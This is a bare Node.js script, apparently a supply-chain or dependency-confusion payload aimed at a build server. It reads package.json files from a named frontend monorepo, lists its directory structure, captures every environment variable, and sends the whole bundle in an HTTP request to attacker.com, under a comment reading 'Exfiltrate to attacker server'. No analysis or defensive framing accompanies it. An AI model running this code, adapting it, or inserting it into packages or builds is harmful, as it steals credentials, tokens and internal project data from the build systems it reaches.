const fs = require('fs');
const http = require('http');
const path = require('path');

const monorepoPath = '/home/build/workspace/uphold-frontend-monorepo';
let data = '';
try {
  // Read root package.json
  data += fs.readFileSync(path.join(monorepoPath, 'package.json'), 'utf8');
  // Read core package.json
  data += '\n' + fs.readFileSync(path.join(monorepoPath, 'packages/core/package.json'), 'utf8');
  // Enumerate directory structure
  const structure = fs.readdirSync(monorepoPath, { withFileTypes: true })
    .map(dirent => `${dirent.isDirectory() ? 'DIR' : 'FILE'}: ${dirent.name}`)
    .join('\n');
  data += '\nStructure:\n' + structure;
  // Capture environment variables
  data += '\nEnvironment:\n' + JSON.stringify(process.env);
} catch (e) {
  data += `Error: ${e.message}`;
}

// Exfiltrate to attacker server
http.get(`http://attacker.com/callback?data=${encodeURIComponent(data)}`);
